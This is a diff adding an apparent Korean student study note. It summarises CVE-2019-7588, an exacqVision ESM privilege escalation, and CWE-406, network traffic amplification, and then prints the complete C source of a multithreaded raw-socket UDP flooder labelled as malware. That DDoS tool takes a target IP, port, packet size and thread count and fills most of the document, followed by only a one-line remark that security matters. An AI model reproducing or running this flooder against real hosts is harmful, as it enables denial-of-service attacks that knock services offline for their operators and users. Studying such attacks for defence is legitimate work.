@@ -1,0 +1,299 @@
+1. CVE 찾아보기
+
+ 운영체제 레벨 취약점
+  
+CVE - 2019 - 7588 NVD( National Vulnerability database)
+ 
+무단 권한 상승이 잠재적으로 이루어질 수있는 exacqVision ESM (Enterprise System Manager) v5.12.2 응용 프로그램의 취약점
+
+Tyco Security Solutions는 exacqVision ESM (Enterprise System Manager) v5.12.2 응용 프로그램의 취약점을 확인하여 
+무단 권한 승격을 달성하고 악용 가능성을 피하기 위해 완화 조치에 대한 지침을 제공
+
+영향 
+exacqVision ESM v5.12.2 및 Windows 운영 체제에서 실행되는 이전 ESM의 모든 버전에 영향을 줌
+루트 디렉터리에서 상속되지 않은 사용 권한이있는 Windows Server OS 또는 Linux 배포에 영향을 주지 않음.
+
+약점
+승인된 사용자는 낮은 권한 계정이 디렉터리에있는 파일을 수정할 수 있도록 ESM 폴더에 대한 사용 권한을 부여 가능하여 실행 파일의 이름을 바꿀 수 있으며 
+시스템 수준 권한을 제공하는 악의적인 행위자에게 다시 연결될 수 있는 악의적인 파일로 대체 될 수 있습니다. 
+
+
+2. CWE 찾아보기
+
+CWE - 406 Insufficient Control of Network Message Volume ( 네트워크 메세지 볼륨 제어 불충분 (네트워크 증폭))
+
+ 소프트웨어는 전송된 네트워크 트래픽 볼륨을 충분히 감지하거나 제어하지 못해 행위자가 허용해야하는 것보다 
+ 많은 트래픽을 전송할 수 있기에 비대칭 자원 소비를 제한하는 정책이 필요.
+ 
+ 만일 비대칭 자원 소비를 제한하는 정책이 없으면 응용 프로그램 또는 시스템은 합법적인 전송과 대상 시스템에서 증폭 공격으로 작용할 트래픽(전송량)을 구분하지 못하는 경우가 발생
+
+ //시스템은 클라이언트의 출저 또는 액세스 수준에 따라 클라이언트를 대신하여 전송되는 트래픽 양을 제한하도록 구성 가능
+
+ 약점 : 응용 프로그램이 UDP를 사용하는 경우 다른 protocol 이나 contexts에 존재할 수 있지만 트래픽 증폭을 수행하기 위해 UDP 고유의 약점을 사용하는 스푸핑 공격을받을 수 있습니다.
+
+ 블랙 해커가 이 약점을 악용하는 경우 
+ 
+ 1. 시스템 리소스가 빨리 소모되어 애플리케이션 성능이 저하되거나 시스템이 다운 될 수 있습니다. 
+
+ 2. 네트워크 성능에 영향을 줄 수 있으며 네트워크 성능에 의존하는 다른 시스템 및 응용 프로그램을 공격하는 데 사용될 수 있습니다.
+
+ 즉 , 네트워크 증폭 : 스푸핑으로 수행 될 때  공격자 (사용자 역할 수행)에서 앰프 및 앰프에서 피해자까지의 다중 채널 공격
+
+        스푸핑 공격을 단순화하는 약점에서 비롯될 수 있음.
+
+3. 악성코드
+ 
+ DDOS  소스 코드 (c언어)
+
+#include <time.h>
+#include <arpa/inet.h>
+#include <ifaddrs.h>
+#include <netdb.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netinet/ip.h>
+#include <netinet/udp.h>
+ 
+#define MAX_PACKET_SIZE 4096
+#define PHI 0x9e3779b9
+ 
+static uint32_t Q[4096], c = 362436;
+
+struct thread_data{
+        int pks;
+        int throttle;
+	int thread_id;
+	unsigned int floodport;
+	struct sockaddr_in sin;
+};
+ 
+void init_rand(uint32_t x)
+{
+        int i;
+ 
+        Q[0] = x;
+        Q[1] = x + PHI;
+        Q[2] = x + PHI + PHI;
+ 
+        for (i = 3; i < 4096; i++)
+                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
+}
+ 
+uint32_t rand_cmwc(void)
+{
+        uint64_t t, a = 18782LL;
+        static uint32_t i = 4095;
+        uint32_t x, r = 0xfffffffe;
+        i = (i + 1) & 4095;
+        t = a * Q[i] + c;
+        c = (t >> 32);
+        x = t + c;
+        if (x < c) {
+                x++;
+                c++;
+        }
+        return (Q[i] = r - x);
+}
+
+char *myStrCat (char *s, char *a) {
+    while (*s != '\0') s++;
+    while (*a != '\0') *s++ = *a++;
+    *s = '\0';
+    return s;
+}
+
+char *replStr (char *str, size_t count) {
+    if (count == 0) return NULL;
+    char *ret = malloc (strlen (str) * count + count);
+    if (ret == NULL) return NULL;
+    *ret = '\0';
+    char *tmp = myStrCat (ret, str);
+    while (--count > 0) {
+        tmp = myStrCat (tmp, str);
+    }
+    return ret;
+}
+
+
+/* function for header checksums */
+unsigned short csum (unsigned short *buf, int nwords)
+{
+  unsigned long sum;
+  for (sum = 0; nwords > 0; nwords--)
+  sum += *buf++;
+  sum = (sum >> 16) + (sum & 0xffff);
+  sum += (sum >> 16);
+  return (unsigned short)(~sum);
+}
+void setup_ip_header(struct iphdr *iph)
+{
+  struct ifaddrs *ifaddr, *ifa;
+           int family, s;
+           char host[NI_MAXHOST];
+
+           if (getifaddrs(&ifaddr) == -1) {
+               perror("getifaddrs");
+               exit(EXIT_FAILURE);
+           }
+
+           /* Walk through linked list, maintaining head pointer so we
+              can free list later */
+
+           for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
+               if (ifa->ifa_addr == NULL)
+                   continue;
+
+               family = ifa->ifa_addr->sa_family;
+
+               if (family == AF_INET) {
+                   s = getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),
+                           host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
+                   if (s != 0) {
+                       printf("getnameinfo() failed: %s\n", gai_strerror(s));
+                       exit(EXIT_FAILURE);
+                   }
+                   if(strcmp(host, "127.0.0.1") != 0){
+                       break;
+                   }
+               }
+           }
+           freeifaddrs(ifaddr);
+  iph->ihl = 5;
+  iph->version = 4;
+  iph->tos = 0;
+  iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr);
+  iph->id = htonl(54321);
+  iph->frag_off = 0;
+  iph->ttl = MAXTTL;
+  iph->protocol = IPPROTO_UDP;
+  iph->check = 0;
+
+  // Initial IP, changed later in infinite loop
+  iph->saddr = inet_addr(host);
+}
+
+void setup_udp_header(struct udphdr *udph)
+{
+  udph->source = htons(5678);
+  udph->check = 0;
+}
+
+void *flood(void *par1)
+{
+  struct thread_data *td = (struct thread_data *)par1;
+  fprintf(stdout, "Thread %d started\n", td->thread_id);
+  char datagram[MAX_PACKET_SIZE];
+  struct iphdr *iph = (struct iphdr *)datagram;
+  struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
+  struct sockaddr_in sin = td->sin;
+  char new_ip[sizeof "255.255.255.255"];
+
+  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+  if(s < 0){
+    fprintf(stderr, "Could not open raw socket.\n");
+    exit(-1);
+  }
+
+  unsigned int floodport = td->floodport;
+
+  // Clear the data
+  memset(datagram, 0, MAX_PACKET_SIZE);
+
+  // Set appropriate fields in headers
+  setup_ip_header(iph);
+  setup_udp_header(udph);
+
+  char *data = (char *)udph + sizeof(struct udphdr);
+  data = replStr("\xFF", td->pks);
+  udph->len=htons(td->pks);
+
+  iph->tot_len += td->pks;
+
+  udph->dest = htons(floodport);
+
+  iph->daddr = sin.sin_addr.s_addr;
+  iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+
+  int tmp = 1;
+  const int *val = &tmp;
+  if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
+    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
+    exit(-1);
+  }
+
+  int throttle = td->throttle;
+
+  uint32_t random_num;
+  uint32_t ul_dst;
+  init_rand(time(NULL));
+  if(throttle == 0){
+    while(1){
+      sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
+      random_num = rand_cmwc();
+      udph->source = htons(random_num & 0xFFFF);
+      iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+    }
+  } else {
+    while(1){
+      throttle = td->throttle;
+      sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
+      random_num = rand_cmwc();
+      udph->source = htons(random_num & 0xFFFF);
+      iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
+
+     while(--throttle);
+    }
+  }
+}
+int main(int argc, char *argv[ ])
+{
+  if(argc < 6){
+    fprintf(stderr, "Invalid parameters!\n");
+    fprintf(stdout, "UDP Flooder v1.2.8 FINAL by ohnoes1479\nUsage: %s <target IP/hostname> <port to be flooded> <throttle (lower is faster)> <packet size> <number threads to use> <time (optional)>\n", argv[0]);
+    exit(-1);
+  }
+
+  fprintf(stdout, "Setting up Sockets...\n");
+
+  int num_threads = atoi(argv[5]);
+  int packet_size = atoi(argv[4]);
+  unsigned int floodport = atoi(argv[2]);
+  pthread_t thread[num_threads];
+  struct sockaddr_in sin;
+
+  sin.sin_family = AF_INET;
+  sin.sin_port = htons(floodport);
+  sin.sin_addr.s_addr = inet_addr(argv[1]);
+
+  struct thread_data td[num_threads];
+
+  int i;
+  for(i = 0;i<num_threads;i++){
+    td[i].thread_id = i;
+    td[i].pks = packet_size;
+    td[i].sin = sin;
+    td[i].floodport = floodport;
+    td[i].throttle = atoi(argv[3]);
+    pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
+  }
+  fprintf(stdout, "Starting Flood...\n");
+  if(argc > 6)
+  {
+    sleep(atoi(argv[6]));
+  } else {
+    while(1){
+      sleep(1);
+    }
+  }
+
+  return 0;
+}
+
+이로써 다양한 공격을 막기 위한 보안이 더욱 중요시 되어야 한다고 생각
+
+
+
